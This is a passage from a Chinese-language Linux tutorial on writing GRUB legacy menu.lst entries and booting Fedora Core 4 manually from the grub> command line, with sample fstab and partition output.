/boot/vmlinuz*/boot/vmlinuz-2.6.11-1.1369_FC4   注：看到内核vmlinuz所处的目录；</code></pre><p>于是我们就可以这样kernel 这行了；</p><pre><code>kernel /boot/vmlinuz-2.6.11-1.1369_FC4  ro root=/dev/hda7</code></pre><h3 id="3）initrd-命令行的写法；"><a href="#3）initrd-命令行的写法；" class="headerlink" title="3）initrd 命令行的写法；"></a>3）initrd 命令行的写法；</h3><p>如果是/boot独立一个分区，initrd 一行要把/boot中省略；如果/boot不是处于一个分区，而是和Linux的/分区处于同一分区，不应该省略；</p><p>比如我们在2）中用的例子；现在拿到这里，我们应该首先查看 /boot中的initrd的文件名到底是什么；</p><pre><code>[root@localhost ~]# ls /boot/initrd*/boot/initrd-2.6.11-1.1369_FC4.img</code></pre><p>如果是通过df -lh 得知或查看/etc/fstab 也行， 得知/boot是独立的分区；这时initrd 应该写成；</p><pre><code>initrd  /initrd-2.6.11-1.1369_FC4.img</code></pre><p>如果是 /boot不是独处一个分区，而是在/同一处一个分区， 则要写成；</p><pre><code>initrd  /boot/initrd-2.6.11-1.1369_FC4.img</code></pre><h3 id="4）menu-lst第一种写法的总结和实践；"><a href="#4）menu-lst第一种写法的总结和实践；" class="headerlink" title="4）menu.lst第一种写法的总结和实践；"></a>4）menu.lst第一种写法的总结和实践；</h3><p>在这里，我们只说重要的，不重要的就一带而过了；</p><h4 id="1］用fdisk-l-；df-lh-；more-etc-fstab来确认分区情况；"><a href="#1］用fdisk-l-；df-lh-；more-etc-fstab来确认分区情况；" class="headerlink" title="1］用fdisk -l ；df -lh ；more /etc/fstab来确认分区情况；"></a>1］用fdisk -l ；df -lh ；more /etc/fstab来确认分区情况；</h4><p>我们过fdisk -l ；df -lh ; more /etc/fstab 来确认/boot所在的分区，及Linux的根分区所在位置；</p><p>比如我们确认/boot和Linux的/分区同处一个分区；</p><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>localhost ~]# df -lhFilesystem            容量  已用 可用 已用% 挂载点/dev/hda7              <span class="hljs-number">11</span>G  <span class="hljs-number">9.2</span>G  <span class="hljs-number">1.2</span>G  <span class="hljs-number">90</span>% //dev/shm              <span class="hljs-number">236</span>M     <span class="hljs-number">0</span>  <span class="hljs-number">236</span>M   <span class="hljs-number">0</span>% /dev/shm</code></pre><p>然后我们/etc/fstab 中,查看/分所在的分区或分区标签是什么；</p><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>localhost ~]# more /etc/fstab# This file <span class="hljs-keyword">is</span> edited by fstab-sync - see <span class="hljs-string">'man fstab-sync'</span> <span class="hljs-keyword">for</span> detailsLABEL=/                 /                       ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">1</span>/dev/devpts             /dev/pts                devpts  gid=<span class="hljs-number">5</span>,mode=<span class="hljs-number">620</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/shm                /dev/shm                tmpfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/proc               /proc                   proc    defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/sys                /sys                    sysfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>LABEL=SWAP-hda1         swap                    swap    defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/hdc                /media/cdrecorder       <span class="hljs-built_in">auto</span>    pamconsole,exec,noauto,managed <span class="hljs-number">0</span> <span class="hljs-number">0</span></code></pre><p>经过上面的df -lh 和more /etc/fstab 的对照中得知，/boot并是独处一个分区，而是和/在同一个分区；这个Linux系统安装在/dev/hda7上，文件系统（此分区）的标签为 LABEL=/ ，/boot也是处于/dev/hda7 ，/dev/hda7也可以说是 root (hd0,6)；</p><h4 id="2-查看内核vmlinuz的和initrd文件名的全称；"><a href="#2-查看内核vmlinuz的和initrd文件名的全称；" class="headerlink" title="2]查看内核vmlinuz的和initrd文件名的全称；"></a>2]查看内核vmlinuz的和initrd文件名的全称；</h4><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>localhost ~]# ls -lh /boot/vmlinuz*-rw-r--r--  <span class="hljs-number">1</span> root root <span class="hljs-number">1.6</span>M <span class="hljs-number">2005</span><span class="hljs-number">-06</span><span class="hljs-number">-03</span>  /boot/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4[<span class="hljs-symbol">root@</span>localhost ~]# ls -lh /boot/initrd*-rw-r--r--  <span class="hljs-number">1</span> root root <span class="hljs-number">1.1</span>M <span class="hljs-number">11</span>月 <span class="hljs-number">26</span> <span class="hljs-number">22</span>:<span class="hljs-number">30</span> /boot/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img</code></pre><p>3]开始写menu.lst ；</p><p>我们根据上面所提到的，可以写成如下的样子；</p><pre><code class="hljs lsl"><span class="hljs-section">default</span>=<span class="hljs-number">0</span> timeout=<span class="hljs-number">5</span>title FC4        root (hd0,<span class="hljs-number">6</span>)        kernel /boot/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=LABEL=/        initrd /boot/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img</code></pre><p>也可以写成；</p><pre><code class="hljs lsl"><span class="hljs-section">default</span>=<span class="hljs-number">0</span> timeout=<span class="hljs-number">5</span>title FC4        root (hd0,<span class="hljs-number">6</span>)        kernel /boot/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=/dev/hda7        initrd /boot/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img</code></pre><p>注解：上面两个不同之处在于一指定Linux的根/所在的分区时，一个是用了文件系统的标签，另一个没有用标签；</p><h2 id="2、menu-lst的写法之二，精简型；"><a href="#2、menu-lst的写法之二，精简型；" class="headerlink" title="2、menu.lst的写法之二，精简型；"></a>2、menu.lst的写法之二，精简型；</h2><p>本写法主要是把指定/boot所位于的所分区直接写入kernel 指令行；这样就省略了通过root (hd[0-n],y)来指定/boot所位于的分区；</p><h3 id="1-第一种情况：-boot和Linux的-根分区在同一个分区；"><a href="#1-第一种情况：-boot和Linux的-根分区在同一个分区；" class="headerlink" title="1)第一种情况：/boot和Linux的/根分区在同一个分区；"></a>1)第一种情况：/boot和Linux的/根分区在同一个分区；</h3><p>有前面的那么多的讲解，menu.lst写法之二就好理解多了；也得分两种情况，咱们先把/boot并不是独处一个分区，而是和Linux的根分区处于同一个分区；我们以 4）menu.lst第一种方法的写法总结 的实例为例子；</p><pre><code class="hljs lsl"><span class="hljs-section">default</span>=<span class="hljs-number">0</span> timeout=<span class="hljs-number">5</span>title FC4x        kernel (hd0,<span class="hljs-number">6</span>)/boot/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=/dev/hda7        initrd (hd0,<span class="hljs-number">6</span>)/boot/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img</code></pre><p>注解：</p><p>title FC4x 注：自己为这个Linux 起个简单的名，以title开头，然后一个空格，后面就自己发挥吧，FC4或FC4x都行；</p><p>kernel 空格 (hd0,6)/boot/vmlinuz-2.6.11-1.1369_FC4 空格 ro 空格 root=/dev/hda7</p><p>kernel 这行这样理解 kernel (boot所在的分区)/boot/内核文件件全称 ro root=Linux根所位于的分区或标签</p><p>initrd 空格 (hd0,6)/boot/initrd-2.6.11-1.1369_FC4.img<br>initrd 这行可以这样理解 initrd (/boot所在的分区)/boot/内核文件名全称</p><h3 id="2）第二种情况：-boot独立一个分区，和Linux的根分区不是同一个分区；"><a href="#2）第二种情况：-boot独立一个分区，和Linux的根分区不是同一个分区；" class="headerlink" title="2）第二种情况：/boot独立一个分区，和Linux的根分区不是同一个分区；"></a>2）第二种情况：/boot独立一个分区，和Linux的根分区不是同一个分区；</h3><p>比如我们查看到df -lh 得到的是</p><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>localhost ~]# df -lhFilesystem            容量  已用 可用 已用% 挂载点/dev/hda6              <span class="hljs-number">200</span>M  <span class="hljs-number">120</span>M  <span class="hljs-number">80</span>M  <span class="hljs-number">60</span>% /boot/dev/hda7              <span class="hljs-number">11</span>G  <span class="hljs-number">9.2</span>G  <span class="hljs-number">1.2</span>G  <span class="hljs-number">90</span>% /</code></pre><p>我们再进一行查看/etc/fstab 得知；</p><pre><code class="hljs angelscript">LABEL=/                 /                       ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">1</span>LABEL=/boot             /boot                   ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">2</span></code></pre><p>所以我们应该写成如下的；</p><pre><code class="hljs angelscript">title FC4x        kernel (hd0,<span class="hljs-number">5</span>)/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=LABEL=/        initrd (hd0,<span class="hljs-number">5</span>)/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img</code></pre><p>因为Linux的根分区是/dev/hda7，通过/etc/fstab和df -h的内容得知标签为 LABEL=/的分区就是/dev/hda7 ，所以有；</p><pre><code class="hljs angelscript">title FC4x        kernel (hd0,<span class="hljs-number">5</span>)/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=/dev/hda7        initrd (hd0,<span class="hljs-number">5</span>)/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img</code></pre><h1 id="五、通过GRUB命令行来启动Linux操作系统；"><a href="#五、通过GRUB命令行来启动Linux操作系统；" class="headerlink" title="五、通过GRUB命令行来启动Linux操作系统；"></a>五、通过GRUB命令行来启动Linux操作系统；</h1><p>GRUB的命令行才是王道，如果知道怎么用命令行来启动操作系统，那理解menu.lst的写法也不难；也就是说在开机的时候，不用GRUB的菜单，通过GRUB的命令也是一样能把操作系统引导起来。</p><p>因为menu.lst的内容就是GRUB的一个一个的指令集合；是不是Linux这玩意很神奇？</p><h2 id="1、为什么需要学习GRUB的命令行；"><a href="#1、为什么需要学习GRUB的命令行；" class="headerlink" title="1、为什么需要学习GRUB的命令行；"></a>1、为什么需要学习GRUB的命令行；</h2><p>当我们把GRUB的menu.lst写错的时候，或者丢掉了menu.lst的时，比如在开机的时候，GRUB会出现grub&gt;类似的命令提示符，这时需要我们用命令行启动系统；当然您可以不用定义GRUB的菜单 ，直接用命令行来启动系统，比如我现在就是，为了写GRUB的文档，就把menu.lst 删除了，直接用命令来启动系统；</p><h2 id="2、用命令行来引导Linux操作系统的步骤；"><a href="#2、用命令行来引导Linux操作系统的步骤；" class="headerlink" title="2、用命令行来引导Linux操作系统的步骤；"></a>2、用命令行来引导Linux操作系统的步骤；</h2><p>通过命令行来引导操作系统的流程，也没有什么难的；无非是把指令手工输入到grub&gt;提示符的后面；在这个过程中，tab键的命令补齐功能就显得很重要了。如果您不知道有哪些命令，可以输入help；</p><h3 id="1）进入GRUB的命令行模式-grub-gt"><a href="#1）进入GRUB的命令行模式-grub-gt" class="headerlink" title="1）进入GRUB的命令行模式 grub&gt;"></a>1）进入GRUB的命令行模式 grub&gt;</h3><p>如果开机时，GRUB出现的是grub&gt;，说明你没有/etc/grub/menu.lst ，您需要自己写一个才会GRUB的菜单，让我们来选择进入哪个系统。如果有GRUB的菜单，您可以按Ctrl+c组合键进入GRUB的命令行模式，会出现grub&gt; 提示符；</p><pre><code>grub&gt;</code></pre><h3 id="2）获取帮助GRUB的-help"><a href="#2）获取帮助GRUB的-help" class="headerlink" title="2）获取帮助GRUB的 help"></a>2）获取帮助GRUB的 help</h3><p>只要您在grub&gt;提示符的后面输入help 就能得到GRUB所有的命令提示；</p><pre><code class="hljs routeros">grub&gt; helpblocklist FILE                         bootcat FILE                               chainloader [--force] FILEclear                                  color NORMAL [HIGHLIGHT]configfile FILE                        device DRIVE DEVICEdisplayapm                             displaymem<span class="hljs-builtin-name">find</span> FILENAME                          geometry DRIVE [CYLINDER HEAD SECTOR [halt [--no-apm]                        help [--all] [PATTERN <span class="hljs-built_in">..</span>.]hide PARTITION                         initrd FILE [ARG <span class="hljs-built_in">..</span>.]kernel [--no-mem-option] [<span class="hljs-attribute">--type</span>=TYPE] makeactivemap TO_DRIVE FROM_DRIVE                md5cryptmodule FILE [ARG <span class="hljs-built_in">..</span>.]                  modulenounzip FILE [ARG <span class="hljs-built_in">..</span>.]pager [FLAG]                           partnew PART<span class="hljs-built_in"> TYPE </span>START LENparttype PART<span class="hljs-built_in"> TYPE </span>                    quitreboot                                 root [DEVICE [HDBIAS]]rootnoverify [DEVICE [HDBIAS]]         serial [<span class="hljs-attribute">--unit</span>=UNIT] [<span class="hljs-attribute">--port</span>=PORT] [--setkey [TO_KEY FROM_KEY]               setup [<span class="hljs-attribute">--prefix</span>=DIR] [<span class="hljs-attribute">--stage2</span>=STAGE2_terminal [--dumb] [--no-echo] [--no-ed terminfo [<span class="hljs-attribute">--name</span>=NAME --cursor-addresstestvbe MODE                           unhide PARTITIONuppermem KBYTES                        vbeprobe [MODE]</code></pre><p>如果需要得到某个指令的帮助，就在 help 后面空一格，然后输入指令，比如；</p><pre><code>grub&gt;help kernel </code></pre><h3 id="3）cat的用法；"><a href="#3）cat的用法；" class="headerlink" title="3）cat的用法；"></a>3）cat的用法；</h3><p>cat指令是用来查看文件内容的，有时我们不知道Linux的/boot分区，以及/根分区所在的位置，要查看/etc/fstab的内容来得知，这时，我们就要用到cat (hd[0-n],y)/etc/fstab 来获得这些内容；注意要学会用tab键命令补齐的功能；</p><pre><code class="hljs routeros">grub&gt; cat (     按tab 键会出来hd0或hd1之类的；grub&gt; cat (hd0, 注：输入hd0,然后再按tab键；会出来分区之类的；grub&gt; cat (hd0,6)Possible partitions are:   Partition num: 0,  Filesystem<span class="hljs-built_in"> type </span>unknown, partition<span class="hljs-built_in"> type </span>0x7   Partition num: 4,  Filesystem<span class="hljs-built_in"> type </span>is fat, partition<span class="hljs-built_in"> type </span>0xb   Partition num: 5,  Filesystem<span class="hljs-built_in"> type </span>is reiserfs, partition<span class="hljs-built_in"> type </span>0x83   Partition num: 6,  Filesystem<span class="hljs-built_in"> type </span>is ext2fs, partition<span class="hljs-built_in"> type </span>0x83   Partition num: 7,  Filesystem<span class="hljs-built_in"> type </span>unknown, partition<span class="hljs-built_in"> type </span>0x83   Partition num: 8,  Filesystem<span class="hljs-built_in"> type </span>is reiserfs, partition<span class="hljs-built_in"> type </span>0x83   Partition num: 9,  Filesystem<span class="hljs-built_in"> type </span>unknown, partition<span class="hljs-built_in"> type </span>0x82</code></pre><pre><code>grub&gt; cat (hd0,6)/etc/fstab 注：比如我想查看一下 (hd0,6)/etc/fstab的内容就这样输入；</code></pre><pre><code class="hljs angelscript">LABEL=/                 /                       ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">1</span>/dev/devpts             /dev/pts                devpts  gid=<span class="hljs-number">5</span>,mode=<span class="hljs-number">620</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/shm                /dev/shm                tmpfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/proc               /proc                   proc    defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/sys                /sys                    sysfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>LABEL=SWAP-hda1         swap                    swap    defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/hdc                /media/cdrecorder       <span class="hljs-built_in">auto</span>    pamconsole,exec,noauto,managed <span class="hljs-number">0</span> <span class="hljs-number">0</span></code></pre><p>有的弟兄可能会说，我不知道Linux安装在了哪个分区。那根据文件系统来判断一个一个的尝试总可以吧我；只要能cat出/etc/fstab就能为以后引导带来方便；</p><p>主要查看/etc/fstab中的内容，主要是Linux的/分区及/boot是否是独立的分区；如果没有/boot类似的行，证明/boot和 Linux的/处于同一个硬盘分区；比如上面的例子中LABEL=/ 这行是极为重要的；说明Linux系统就安在标签为LABEL=/的分区中；</p><p>如果您的Linux系统/boot和/没有位于同一个分区，可能cat (hd[a-n],y) 查到的是类似下面的；</p><pre><code class="hljs angelscript">LABEL=/                 /                       ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">1</span>LABEL=/boot             /boot                   ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">2</span></code></pre><h3 id="4）-root-hd-0-n-y-指令来指定-boot所在的分区；"><a href="#4）-root-hd-0-n-y-指令来指定-boot所在的分区；" class="headerlink" title="4） root (hd[0-n,y) 指令来指定/boot所在的分区；"></a>4） root (hd[0-n,y) 指令来指定/boot所在的分区；</h3><p>其实这个root (hd[0,n],y)是可以省略的，如果省略了，我们要在kerenl 命令中指定；我们前面已经说过 (hd[0-n],y) 硬盘分区的表示方法的用途；主要是用来指定 /boot所在的分区；</p><p>比如我们确认/boot和 (hd0,6)，所以就可以这样来输入root (hd0,6)</p><pre><code>grub&gt; root (hd0,6)</code></pre><p>如果发现不对，可以重新来过；没有什么大不了的；</p><h3 id="5）-kernel-指令，用来指定Linux的内核，及所在的分区；"><a href="#5）-kernel-指令，用来指定Linux的内核，及所在的分区；" class="headerlink" title="5） kernel 指令，用来指定Linux的内核，及所在的分区；"></a>5） kernel 指令，用来指定Linux的内核，及所在的分区；</h3><p>kernel 这个指令可能初学者有点怕，不知道内核在哪个分区，及内核文件名的全称是什么。不要忘记tab键的命令补齐的应用；</p><p>如果我们已经通过root (hd[0-n],y) 指定了/boot所在的分区，语法有两个：</p><p>如果/boot和Linux的/位于同一个分区，应该是下面的一种格式；</p><p>kernel /boot/vmlinuz在这里按tab键来补齐，就看到内核全称了 ro root=/dev/hd[a-z]X</p><p>如果/boot有自己独立的分区，应该是；</p><p>kernel /vmlinuz在这里按tab键来补齐，就看到内核全称了 ro root=/dev/hd[a-z]X</p><p>在这里 root=/dev/hd[a-z]X 是Linux 的/根所位于的分区，如果不知道是哪个分区，就用tab出来的来计算，一个一个的尝试；或用cat (hd[0-n],y)/etc/fstab 中得到Linux的/所在的分区或分区的标签；</p><pre><code>grub&gt; kernel /boot/在这里按tab键；这样就列出/boot中的文件了；</code></pre><pre><code class="hljs angelscript">Possible files are: grub initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img System.map<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 config<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 grubBAK memtest86+<span class="hljs-number">-1.55</span><span class="hljs-number">.1</span> xen-syms xen.gzgrub&gt; kernel /boot/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=LABEL=/    [Linux-bzImage, setup=<span class="hljs-number">0x1e00</span>, size=<span class="hljs-number">0x18e473</span>]</code></pre><p>注解： root=LABEL=/ 是Linux的/所在的分区的文件系统的标签；如果您知道Linux的/在哪个具体的分区，用root=/dev/hd[a-z]X来指定也行。比如下面的一行也是可以的；</p><pre><code>grub&gt; kernel /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=/dev/hda7</code></pre><p>也可以把/boot所在的分区的指定 root (hd[0-n],y)这行省掉，直接在kernel 中指定/boot所在的分区；所以就在下面的语法；</p><p>如果是/boot和Linux的根同处一个分区；<br>kernel (hd[0-n],y)/boot/vmlinuz ro root=/dev/hd[a-z]X</p><p>比如：</p><pre><code>grub&gt;kernel</code></pre><p>如果是/boot和Linux所在的根不在一个分区；则是；</p><pre><code>kernel (hd[0-n],y)/vmlinuz  ro root=/dev/hd[a-z]Xgrub&gt; kernel (hd0,6)/boot/vmlinuz-2.6.11-1.1369_FC4 ro root=/dev/hda7 [Linux-bzImage, setup=0x1e00, size=0x18e473]</code></pre><p>或下面的输入，以cat 出/etc/fstab内容为准；</p><pre><code class="hljs angelscript">grub&gt; kernel (hd0,<span class="hljs-number">6</span>)/boot/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=LABEL=/   [Linux-bzImage, setup=<span class="hljs-number">0x1e00</span>, size=<span class="hljs-number">0x18e473</span>]</code></pre><h3 id="6）initrd-命令行来指定initrd文件；"><a href="#6）initrd-命令行来指定initrd文件；" class="headerlink" title="6）initrd 命令行来指定initrd文件；"></a>6）initrd 命令行来指定initrd文件；</h3><pre><code class="hljs angelscript">grub&gt; initrd /boot/initrd在这里tab 来补齐；grub&gt; initrd /boot/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img   [Linux-initrd @ <span class="hljs-number">0x2e1000</span>, <span class="hljs-number">0x10e685</span> bytes]</code></pre><p>如果/boot是独立的一个分区，应该是如下样子的语法；比如下面的；</p><pre><code class="hljs angelscript">grub&gt; initrd /initrd在这里tab 来补齐；grub&gt; initrd /initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img   [Linux-initrd @ <span class="hljs-number">0x2e1000</span>, <span class="hljs-number">0x10e685</span> bytes]</code></pre><h3 id="7）boot-引导系统；"><a href="#7）boot-引导系统；" class="headerlink" title="7）boot 引导系统；"></a>7）boot 引导系统；</h3><pre><code>grub&gt;boot</code></pre><p>前面的几个步骤都弄好 。就进入引导；尝试一下就知道了。。</p><h3 id="8）引导Linux系统实例全程回放；"><a href="#8）引导Linux系统实例全程回放；" class="headerlink" title="8）引导Linux系统实例全程回放；"></a>8）引导Linux系统实例全程回放；</h3><p>实例：/boot和Linux的/处于同一个硬盘分区；</p><pre><code class="hljs angelscript">grub&gt; cat (hd0,<span class="hljs-number">6</span>)/etc/fstab# This file <span class="hljs-keyword">is</span> edited by fstab-sync - see <span class="hljs-string">'man fstab-sync'</span> <span class="hljs-keyword">for</span> detailsLABEL=/                 /                       ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">1</span>/dev/devpts             /dev/pts                devpts  gid=<span class="hljs-number">5</span>,mode=<span class="hljs-number">620</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/shm                /dev/shm                tmpfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/proc               /proc                   proc    defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/sys                /sys                    sysfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>LABEL=SWAP-hda1         swap                    swap    defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/hdc                /media/cdrecorder       <span class="hljs-built_in">auto</span>    pamconsole,exec,noauto,managed <span class="hljs-number">0</span> <span class="hljs-number">0</span>grub&gt; root (hd0,<span class="hljs-number">6</span>)Filesystem type <span class="hljs-keyword">is</span> ext2fs, partition type <span class="hljs-number">0x83</span>grub&gt; kernel /boot/在这里按tab补齐，全列出/boot所有的文件；Possible files are: grub initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img System.map<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 config<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 memtest86+<span class="hljs-number">-1.55</span><span class="hljs-number">.1</span> xen-syms xen.gzgrub&gt; kernel /boot/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=/dev/hda7  注：输入   [Linux-bzImage, setup=<span class="hljs-number">0x1e00</span>, size=<span class="hljs-number">0x18e473</span>]grub&gt; initrd /boot/在这里按tab补齐Possible files are: grub initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img System.map<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 config<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 memtest86+<span class="hljs-number">-1.55</span><span class="hljs-number">.1</span> xen-syms xen.gzgrub&gt; initrd /boot/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img 注;输入<span class="hljs-built_in">int</span>rd文件名的全名；   [Linux-initrd @ <span class="hljs-number">0x2e1000</span>, <span class="hljs-number">0x10e685</span> bytes]grub&gt; boot</code></pre><p>我们指定Linux的根时，可以用cat出来的fstab的内容中Linux的/分区文件系统标签来替代；也就是kernel 那行中 root=/dev/hd[a-z]X；</p><pre><code class="hljs angelscript">grub&gt; cat (hd0,<span class="hljs-number">6</span>)/etc/fstab# This file <span class="hljs-keyword">is</span> edited by fstab-sync - see <span class="hljs-string">'man fstab-sync'</span> <span class="hljs-keyword">for</span> detailsLABEL=/                 /                       ext3    defaults        <span class="hljs-number">1</span> <span class="hljs-number">1</span>/dev/devpts             /dev/pts                devpts  gid=<span class="hljs-number">5</span>,mode=<span class="hljs-number">620</span>  <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/shm                /dev/shm                tmpfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/proc               /proc                   proc    defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/sys                /sys                    sysfs   defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>LABEL=SWAP-hda1         swap                    swap    defaults        <span class="hljs-number">0</span> <span class="hljs-number">0</span>/dev/hdc                /media/cdrecorder       <span class="hljs-built_in">auto</span>    pamconsole,exec,noauto,managed <span class="hljs-number">0</span> <span class="hljs-number">0</span>grub&gt; root (hd0,<span class="hljs-number">6</span>)Filesystem type <span class="hljs-keyword">is</span> ext2fs, partition type <span class="hljs-number">0x83</span>grub&gt; kernel /boot/在这里按tab补齐，全列出/boot所有的文件；Possible files are: grub initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img System.map<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 config<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 memtest86+<span class="hljs-number">-1.55</span><span class="hljs-number">.1</span> xen-syms xen.gzgrub&gt; kernel /boot/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=LABEL=/    [Linux-bzImage, setup=<span class="hljs-number">0x1e00</span>, size=<span class="hljs-number">0x18e473</span>]grub&gt; initrd /boot/在这里按tab补齐Possible files are: grub initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img System.map<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 config<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 grubBAKmemtest86+<span class="hljs-number">-1.55</span><span class="hljs-number">.1</span> xen-syms xen.gzgrub&gt; initrd /boot/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.img 注;输入<span class="hljs-built_in">int</span>rd文件名的全名；   [Linux-initrd @ <span class="hljs-number">0x2e1000</span>, <span class="hljs-number">0x10e685</span> bytes]grub&gt; boot</code></pre><p>如果是/boot和Linux的根分区不在同一个分区，要把kernel和initrd 指令中的/boot去掉，也就是/vmlinuzMMMMMM 或 /initrdNNNN</p><p>也可以不用root (hd[0-n]来指定/boot所在分区，要在kernel 和initrd 中指定；比如Linux的/根所位于的分区和/boot所位于的分区都是(hd0,6)，并且我们cat出来的/etc/fstab是Linux的/根分区的文件系统的标签为LABEL=/，引导操作系统的例子如下；</p><pre><code class="hljs angelscript">grub&gt;kernel (hd0,<span class="hljs-number">6</span>)/boot/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=LABEL=/grub&gt;initrd (hd0,<span class="hljs-number">6</span>)/boot/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.imggrub&gt;boot</code></pre><p>或</p><pre><code class="hljs angelscript">grub&gt;kernel (hd0,<span class="hljs-number">6</span>)/boot/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=/dev/hda7grub&gt;initrd (hd0,<span class="hljs-number">6</span>)/boot/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.imggrub&gt;boot</code></pre><p>如果/boot位于 